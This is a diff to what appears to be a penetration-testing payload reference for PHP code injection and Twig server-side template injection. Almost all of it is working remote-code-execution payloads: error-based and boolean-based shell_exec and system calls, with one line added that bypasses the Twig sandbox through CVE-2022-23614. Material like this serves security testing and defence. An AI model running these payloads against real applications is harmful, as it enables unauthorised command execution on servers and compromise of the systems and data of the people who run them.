@@ -47,9 +47,7 @@ system('id')
 
 // Error-Based RCE
 ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
-fopen(join("", ["Y:/A:/", shell_exec('id')]), "r")
-include(join("", ["Y:/A:/", shell_exec('id')]))
-join("", ["xx", shell_exec('id')])()
+call_user_func(join("", ["xx", shell_exec('id')]))
 
 // Boolean-Based RCE
 1 / (pclose(popen("id", "wb")) == 0)
@@ -163,6 +161,8 @@ $output = $twig > render (
 
 {{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
 {{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
+
+{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
 {{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
 ```
 
